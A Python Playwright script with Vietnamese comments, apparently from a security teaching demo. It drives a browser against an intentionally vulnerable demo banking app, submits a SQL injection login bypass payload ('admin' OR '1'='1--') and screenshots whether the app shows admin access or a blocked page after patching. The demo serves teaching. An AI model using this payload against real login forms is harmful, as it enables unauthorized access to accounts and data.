"""Chặng 7 — Tấn công thật trên trình duyệt bằng Playwright.

Mở Chromium headed, phóng payload SQLi lên ứng dụng đã triển khai, chụp ảnh
trước và sau. Dùng cho cả hai nhịp:

  1. Đầu buổi: ứng dụng CHƯA vá → hacked.html (ADMIN ACCESS GRANTED)
  2. Cuối buổi: ứng dụng ĐÃ vá → blocked.html (TẤN CÔNG ĐÃ BỊ CHẶN)

Cả hai nhịp dùng cùng một payload, cùng một URL, cùng một nút bấm.

Chạy::

    python scripts/tan_cong_that.py
    python scripts/tan_cong_that.py --url http://localhost:5000
    python scripts/tan_cong_that.py --headless   # CI hoặc test
    python scripts/tan_cong_that.py --slow 600   # chậm hơn trên sân khấu

Ảnh chụp nằm ở artifacts/attack-*.png.
"""

import argparse
import os
import sys
import time
from pathlib import Path

# Windows cp1252 không in được tiếng Việt — ép utf-8 nếu chưa có.
if sys.stdout.encoding and sys.stdout.encoding.lower().replace("-", "") != "utf8":
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")

# ---------------------------------------------------------------------------
# Cấu hình
# ---------------------------------------------------------------------------

URL_MAC_DINH = "https://labbank-demo.onrender.com"
THU_MUC_ANH = Path(__file__).resolve().parent.parent / "artifacts"
PAYLOAD = "admin' OR '1'='1--"

# Thời gian chờ trang load (ms) — Render free tier cold-start có thể mất 20-30s
TIMEOUT_TRANG = 60_000


def main():
    ap = argparse.ArgumentParser(description="Chặng 7: tấn công trình duyệt thật")
    ap.add_argument("--url", default=URL_MAC_DINH, help="URL ứng dụng")
    ap.add_argument("--headless", action="store_true", help="Chạy ẩn (cho CI)")
    ap.add_argument("--slow", type=int, default=350,
                    help="Độ trễ mỗi thao tác (ms), mặc định 350 cho sân khấu")
    ap.add_argument("--output", type=Path, default=THU_MUC_ANH,
                    help="Thư mục chứa ảnh chụp")
    args = ap.parse_args()

    args.output.mkdir(parents=True, exist_ok=True)

    # Import ở đây để lỗi thiếu playwright hiện rõ ràng
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("❌ Thiếu playwright. Cài bằng:")
        print("   pip install playwright && python -m playwright install chromium")
        sys.exit(1)

    with sync_playwright() as pw:
        browser = pw.chromium.launch(
            headless=args.headless,
            slow_mo=args.slow,
        )
        context = browser.new_context(
            viewport={"width": 1280, "height": 800},
            locale="vi-VN",
        )
        page = context.new_page()

        print(f"\n{'═' * 60}")
        print(f"  CHẶNG 7 — Tấn công thật trên trình duyệt")
        print(f"  URL:     {args.url}")
        print(f"  Payload: {PAYLOAD}")
        print(f"{'═' * 60}\n")

        # ==================================================================
        # Bước 1: Mở trang, chờ load, chụp trạng thái ban đầu
        # ==================================================================
        print("→ Mở trang chủ...")
        page.goto(args.url, wait_until="networkidle", timeout=TIMEOUT_TRANG)

        # Chờ status banner cập nhật (fetch /version xong).
        # Trên Render free tier cold-start có thể chậm — không để lỗi này
        # dừng cả script.
        try:
            page.wait_for_function(
                """() => {
                    const b = document.getElementById('status-banner');
                    return b && !b.classList.contains('status-unknown');
                }""",
                timeout=20_000,
            )
        except Exception:
            print("  ⏳ Banner chưa cập nhật — tiếp tục (có thể cold-start)")

        anh_truoc = args.output / "attack-01-trang-chu.png"
        page.screenshot(path=str(anh_truoc), full_page=True)
        print(f"  📸 {anh_truoc.name}")

        # Đọc trạng thái hiện tại
        banner = page.locator("#status-banner")
        da_va = "status-patched" in (banner.get_attribute("class") or "")
        print(f"  Trạng thái: {'ĐÃ VÁ' if da_va else 'ĐANG DÍNH LỖ HỔNG'}")

        # ==================================================================
        # Bước 2: Bấm nút tấn công — nút tự điền payload và submit
        # ==================================================================
        print("\n→ Bấm nút THỬ CHIẾM QUYỀN ADMIN...")
        hack_btn = page.locator("#hack-btn")
        hack_btn.scroll_into_view_if_needed()
        time.sleep(0.3)  # nhịp cho sân khấu

        anh_nut = args.output / "attack-02-truoc-bam.png"
        page.screenshot(path=str(anh_nut), full_page=True)
        print(f"  📸 {anh_nut.name}")

        hack_btn.click()

        # Nút bấm kích hoạt JS gõ payload từng ký tự (55ms/char × 22 ký tự ≈ 1.2s)
        # rồi sau 320ms sẽ form.submit() → POST /login → redirect/render.
        # Dùng wait_for_function chờ cho trang mới chứa dấu hiệu quen.
        page.wait_for_function(
            """() => {
                return document.body.textContent.includes('ADMIN ACCESS GRANTED')
                    || document.body.textContent.includes('BỊ CHẶN')
                    || document.body.textContent.includes('Sai tên đăng nhập');
            }""",
            timeout=TIMEOUT_TRANG,
        )
        # Thêm chút chờ cho hiệu ứng glitch/shield render
        time.sleep(0.8)

        # ==================================================================
        # Bước 3: Chụp kết quả — hacked.html hoặc blocked.html
        # ==================================================================
        anh_ket_qua = args.output / "attack-03-ket-qua.png"
        page.screenshot(path=str(anh_ket_qua), full_page=True)
        print(f"  📸 {anh_ket_qua.name}")

        # Phân biệt hai kịch bản bằng nội dung trang
        noi_dung = page.content()

        if "ADMIN ACCESS GRANTED" in noi_dung:
            print("\n  ⚠️  KẾT QUẢ: Tấn công THÀNH CÔNG — ứng dụng chưa được vá.")
            print("     Trang hacked.html hiển thị, toàn bộ dữ liệu khách hàng bị lộ.")
            ket_qua = "hacked"

            # Chụp thêm bảng leak nếu thấy
            leak = page.locator(".leak-table")
            if leak.count() > 0:
                leak.scroll_into_view_if_needed()
                time.sleep(0.3)
                anh_leak = args.output / "attack-04-du-lieu-lo.png"
                page.screenshot(path=str(anh_leak), full_page=True)
                print(f"  📸 {anh_leak.name}")

        elif "TẤN CÔNG ĐÃ BỊ CHẶN" in noi_dung:
            print("\n  ✅ KẾT QUẢ: Tấn công BỊ CHẶN — bản vá hoạt động.")
            print("     Cùng payload, cùng URL, nhưng lỗ hổng không còn tồn tại.")
            ket_qua = "blocked"

        else:
            # Trường hợp không ngờ — có thể sai mật khẩu bình thường
            print("\n  ❓ KẾT QUẢ: Không rõ — trang trả về không phải hacked hay blocked.")
            print("     Kiểm tra URL và trạng thái ứng dụng.")
            ket_qua = "unknown"

        # ==================================================================
        # Bước 4: Quay lại trang chủ, chụp lần cuối
        # ==================================================================
        print("\n→ Quay lại trang chủ...")
        page.goto(args.url, wait_until="networkidle", timeout=TIMEOUT_TRANG)
        try:
            page.wait_for_function(
                """() => {
                    const b = document.getElementById('status-banner');
                    return b && !b.classList.contains('status-unknown');
                }""",
                timeout=20_000,
            )
        except Exception:
            pass  # không chặn vì ảnh cuối chụp bất kể
        time.sleep(0.3)
        anh_cuoi = args.output / "attack-05-sau-tan-cong.png"
        page.screenshot(path=str(anh_cuoi), full_page=True)
        print(f"  📸 {anh_cuoi.name}")

        # ==================================================================
        # Tổng kết
        # ==================================================================
        print(f"\n{'─' * 60}")
        print(f"  Kết quả: {ket_qua.upper()}")
        print(f"  Ảnh chụp: {args.output}")
        print(f"{'─' * 60}\n")

        # Giữ trình duyệt mở 3 giây cho sân khấu (headed mode)
        if not args.headless:
            print("  (Giữ trình duyệt 3 giây cho khán giả nhìn...)")
            time.sleep(3)

        browser.close()

    return 0 if ket_qua != "unknown" else 1


if __name__ == "__main__":
    sys.exit(main())
